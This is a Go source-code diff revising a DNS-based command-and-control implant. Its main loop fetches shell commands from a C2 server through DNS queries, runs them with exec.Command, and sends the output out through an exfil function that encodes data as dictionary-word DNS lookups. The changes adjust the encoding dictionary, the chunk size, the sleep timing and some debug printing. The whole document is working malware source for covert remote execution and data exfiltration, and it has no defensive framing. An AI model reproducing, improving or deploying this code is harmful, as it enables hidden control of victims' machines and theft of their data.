@@ -26,49 +26,63 @@ var (
 )
 
 func getdict() map[string]string {
-	// Get the dictionary
-	corp := ""
-	// Read from corpus.txt
-	file, err := os.Open("corpus.txt")
+	// // Get the dictionary
+	// corp := ""
+	// // Read from corpus.txt
+	// file, err := os.Open("corpus.txt")
+	// if err != nil {
+	// }
+	// defer file.Close()
+
+	// scanner := bufio.NewScanner(file)
+	// for scanner.Scan() {
+	// 	corp += scanner.Text() + ","
+	// }
+
+	// corpus := strings.Split(corp, ",")
+	// letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="
+	// inc := 0
+	// dict := map[string]string{}
+
+	// // for all combinations of letters set a corpus word for all of them
+	// for _, i := range letters {
+	// 	for _, j := range letters {
+	// 		for _, k := range letters {
+	// 			dict[string(i)+string(j)+string(k)] = corpus[inc]
+	// 			inc++
+	// 		}
+	// 	}
+	// }
+
+	// // write all the key value pairs from the dictionary to a file
+	// file, err = os.Create("dictionary.txt")
+	// if err != nil {
+	// }
+	// defer file.Close()
+
+	// for k, v := range dict {
+	// 	file.WriteString(k + ":" + v + "\n")
+	// }
+
+	// read from dictionary.txt
+	file, err := os.Open("dictionary.txt")
 	if err != nil {
 	}
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
-	for scanner.Scan() {
-		corp += scanner.Text() + ","
-	}
-
-	corpus := strings.Split(corp, ",")
-	letters := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="
-	inc := 0
 	dict := map[string]string{}
-
-	// for all combinations of letters set a corpus word for all of them
-	for _, i := range letters {
-		for _, j := range letters {
-			for _, k := range letters {
-				dict[string(i)+string(j)+string(k)] = corpus[inc]
-				inc++
-			}
-		}
-	}
-
-	// write all the key value pairs from the dictionary to a file
-	file, err = os.Create("dictionary.txt")
-	if err != nil {
-	}
-	defer file.Close()
-
-	for k, v := range dict {
-		file.WriteString(k + ":" + v + "\n")
+	for scanner.Scan() {
+		line := scanner.Text()
+		key := strings.Split(line, ":")[0]
+		value := strings.Split(line, ":")[1]
+		dict[key] = value
 	}
 
 	return dict
 }
 
 func mnemonicencode(dict map[string]string, str string) string {
-	fmt.Println(str)
 	out := dict[string(str[0])+string(str[1])+string(str[2])]
 
 	return out
@@ -101,10 +115,10 @@ func pad(tobepadded string) string {
 
 func queryencode(dict map[string]string, str string) []string {
 	str = pad(str)
-	// split str into chunks of 4 characters
-	chunks := make([]string, len(str)/4)
-	for i := 0; i < len(str); i += 4 {
-		chunks[i/4] = str[i : i+4]
+	// split str into chunks of 3 characters
+	chunks := make([]string, len(str)/3)
+	for i := 0; i < len(str)/3; i++ {
+		chunks[i] = str[i*3 : i*3+3]
 	}
 	// encode each chunk
 	encoded := make([]string, len(chunks))
@@ -120,7 +134,9 @@ func exfil(dict map[string]string, str string, uid string) string {
 	str += "mynuts" + uid
 
 	for _, i := range queryencode(dict, str) {
+		// fmt.Println(i)
 		dnsquery(i)
+		time.Sleep(time.Millisecond * 1)
 	}
 
 	return dnsquery(mnemonicencode(dict, "done"))
@@ -142,6 +158,8 @@ func dnsquery(query string) string {
 func execute(cmd string) string {
 	// Execute a shell command
 	out, _ := exec.Command(cmd).CombinedOutput()
+
+	fmt.Println(cmd)
 
 	return string(out)
 }
@@ -190,12 +208,13 @@ func main() {
 
 	for {
 		// Get the command from the C2 server
-		cmd := exfil(dict, "cmd", uid)
+		cmd := dnsquery(fmt.Sprintf("cmd_%s", uid))
+
 		// Execute the command
 		out := execute(cmd)
 		// Send the output to the C2 server
 		fmt.Println(exfil(dict, out, uid))
 
-		time.Sleep(time.Second * 1)
+		time.Sleep(time.Second * 5)
 	}
 }
